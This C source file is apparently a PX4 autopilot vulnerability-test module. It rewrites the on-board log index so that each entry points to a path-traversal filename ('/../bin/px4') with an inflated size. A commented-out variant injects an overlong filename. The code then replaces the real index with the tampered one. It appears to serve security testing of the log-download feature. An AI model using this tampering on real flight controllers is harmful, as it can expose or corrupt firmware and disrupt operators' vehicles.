
#include <px4_platform_common/px4_config.h>
#include <px4_platform_common/log.h>
#include <px4_platform_common/tasks.h>
#include <px4_platform_common/posix.h>
#include <unistd.h>
#include <stdio.h>
#include <poll.h>
#include <string.h>
#include <math.h>

#include <sys/stat.h>
#include <drivers/drv_hrt.h>

#define MOUNTPOINT PX4_STORAGEDIR

//static const char *kLogRoot    = MOUNTPOINT "/log";
static const char *kLogData    = MOUNTPOINT "/logdata.txt";
static const char *kTmpData    = MOUNTPOINT "/$log$.txt";
static const char *wrongFileName    = MOUNTPOINT "/../bin/px4";

__EXPORT int vulner_test_main(int argc, char *argv[]);

int vulner_test_main(int argc, char *argv[])
{
	uint32_t size, date;
	PX4_INFO("[VULNER_TEST] called 'vulner_test_main', target file: %s", kLogData);

	// read file 'kLogData', write file 'kTempData', with edited long log filename.

	FILE *f_r = fopen(kLogData, "r");
	FILE *f_w = fopen(kTmpData, "w");
	if (f_r && f_w) {
		//--- Find requested entry
		char line[160];

		while (fgets(line, sizeof(line), f_r)) {
			char file[160];

			if (sscanf(line, "%" PRIu32 " %" PRIu32 " %159s", &date, &size, file) == 3) {
				PX4_INFO("[VULNER_TEST] stelen(file): %d", (int)strlen(file));

				// put too long filename instead.
				/*
				fprintf(
					f_w,
					"%u %u %s"
					"_this_is_too_long_"
					"123456789_"
					"123456789_"
					"123456789_"
					"123456789_"
					"123456789_"
					"123456789_"
					"123456789_"
					"123456789_"
					"123456789_"
					"123456789_"
					"123456789_"
					"123456789_"
					"123456789_"
					"123456789_"
					"123456789_"
					"123456789_"
					"123456789_"
					"123456789_"
					"123456789_"
					"filename",
					(unsigned)date,
					(unsigned)size,
					file
				);
				// */

				// put wrong filename instead.
				fprintf(
					f_w,
					"%u %u %s\n",
					(unsigned)date,
					(unsigned)(1000000000),
					wrongFileName
				);
			}
		}
	}
	if (f_r) {
		fclose(f_r);
	}
	if (f_w) {
		fclose(f_w);
	}
	unlink(kLogData);
	rename(kTmpData, kLogData);
	return 0;
}
